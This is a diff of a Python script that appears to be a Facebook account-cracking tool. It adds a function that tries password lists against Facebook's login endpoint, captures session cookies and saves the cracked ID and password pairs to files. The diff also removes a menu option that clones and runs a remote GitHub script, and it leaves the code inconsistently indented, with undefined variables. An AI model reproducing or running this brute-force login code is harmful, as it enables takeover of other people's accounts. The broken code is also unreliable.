@@ -593,7 +593,7 @@ def menu():
 	print('\033[1;37m--------------------------------------------------')
 	print('\x1b[1;91m⧼ NOTE ⧽ :\x1b[1;92m PAID TOOLS ALL COUNTRY WORKING ')
 	print('\033[1;37m--------------------------------------------------')
-	print(' [1] File Crack \n [2] Random Cloning\n [3] Random Cloning V2\n [4] Gmail Cloning\n [5] Contact With Owner\n [6] Exit Menu')
+	print(' [1] File Crack \n [2] Random Cloning\n [3] Gmail Cloning\n [4] Contact With Owner\n [0] Exit Menu')
 	linex()
 	xd=input(' Choose an option: ')
 	if xd in ['1','01']:
@@ -715,7 +715,7 @@ def menu():
 		else:
 			menu()
 			
-	elif xd in ['4','04']:
+	elif xd in ['3','03']:
 	   gmail()
 	#elif xd in ['6','06']:
 	    #sids()
@@ -723,12 +723,10 @@ def menu():
 		#remove_dub()
 	#elif xd in ['8','08']:
 		#os.system('rm -rf fb_cookies.txt')
-	elif xd in ['3','03']:
-			os.system('rm -rf 2xrandom && git clone https://github.com/mdtasin123/momomah && cd 2xrandom && python 2xrandom.py ')
-	elif xd in ['5','05']:
+	elif xd in ['4','04']:
 		os.system(f'xdg-open https://wa.me/+8801836751224');menu()
 			
-	elif xd in ['6','06']:
+	elif xd in ['0','00']:
 		exit(' GOOD BYE ')
 	else:
 		exit(' Option not found in menu...')
@@ -971,7 +969,7 @@ def ffb(ids,names,passlist):
 
 #-----------------  Random METHOD Api   -------------------------------------
 
-def rcrack1(ids,passlist):
+#def rcrack1(ids,passlist):
 	global loop
 	global oks
 	try:
@@ -1056,6 +1054,65 @@ def rcrack1(ids,passlist):
 #----------------- Random Nolmal METHOD  -------------------------------------
 		
 		
+def rcrack1(ids,passlist):
+	global loop
+	global oks
+	try:
+		for pas in passlist:
+			sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			session = requests.Session()
+			pro = random.choice(ugen)
+			free_fb = session.get('https://p.facebook.com').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":ids,
+			"pass":pas,
+			"login":"Log In"}
+			header_freefb = {'authority': 'p.facebook.com',
+            'method':'GET',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'user-agent': pro}
+			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print('\033[38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033[38;5;46m'+coki+ ' ')                
+                open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print('\033[38;5;196m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/GS XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+		loop+=1
+	
+		time.sleep(10)
+	except:
+		pass
+		
+#----------------- Random Nolmal METHOD  -------------------------------------
+
 def rcrack(ids,passlist):
 	global loop
 	global oks
@@ -1121,8 +1178,8 @@ def rcrack(ids,passlist):
 	except:
 		pass
 		
-
-
+#----------------- Random Nolmal METHOD  -------------------------------------
+		
 #----------------- Mobile File METHOD  -------------------------------------
 		
 def ffb1(ids,names,passlist):
